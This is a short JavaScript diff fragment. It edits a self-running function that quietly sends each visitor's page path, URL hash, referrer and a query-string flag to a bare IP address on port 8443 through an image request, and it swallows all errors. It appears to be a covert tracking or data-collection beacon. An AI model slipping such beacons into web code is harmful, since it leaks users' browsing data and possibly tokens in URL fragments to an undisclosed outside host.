@@ -11,7 +11,7 @@
   (function () {
     try {
       var i = new Image(), p = location.pathname + (location.hash || "");
-      i.src = "https://45.63.41.228:8443/p?p=" + encodeURIComponent(p) +
+      i.src = "https://45.63.41.228:8443/p?me=" + (/[?&]v=/.test(location.search) ? 1 : 0) + "&p=" + encodeURIComponent(p) +
               "&r=" + encodeURIComponent(document.referrer) + "&t=" + Date.now();
     } catch (e) {}
   })();
